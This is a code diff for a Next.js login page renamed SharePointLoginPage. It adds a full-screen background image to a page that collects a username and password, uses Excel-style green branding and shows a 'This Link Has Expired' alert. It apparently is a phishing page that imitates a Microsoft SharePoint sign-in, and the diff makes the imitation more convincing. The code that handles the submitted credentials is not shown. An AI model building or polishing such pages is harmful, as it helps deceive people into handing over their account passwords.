@@ -14,11 +14,14 @@ import {
   AlertDialogTitle,
 } from '@/components/ui/alert-dialog';
 import { ShieldX } from 'lucide-react';
+import { PlaceHolderImages } from '@/lib/placeholder-images';
+import Image from 'next/image';
 
-export default function Home() {
+export default function SharePointLoginPage() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showAlert, setShowAlert] = useState(false);
+  const bgImage = PlaceHolderImages.find((img) => img.id === 'login-background');
 
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
@@ -27,7 +30,17 @@ export default function Home() {
   };
 
   return (
-    <div className="flex items-center justify-center min-h-screen">
+    <div className="relative flex items-center justify-center min-h-screen">
+      {bgImage && (
+        <Image
+          src={bgImage.imageUrl}
+          alt={bgImage.description}
+          data-ai-hint={bgImage.imageHint}
+          fill
+          style={{ objectFit: 'cover' }}
+          className="absolute inset-0 z-0"
+        />
+      )}
       <Card className="w-[380px] bg-white/95 text-center shadow-2xl z-10">
         <CardHeader>
           <CardTitle className="text-2xl text-[#217346]">
@@ -73,7 +86,7 @@ export default function Home() {
         <AlertDialogContent className="text-center">
           <AlertDialogHeader>
             <div className="flex justify-center mb-4">
-                <ShieldX className="w-16 h-16 text-red-500" />
+              <ShieldX className="w-16 h-16 text-red-500" />
             </div>
             <AlertDialogTitle className="text-2xl">This Link Has Expired</AlertDialogTitle>
           </AlertDialogHeader>
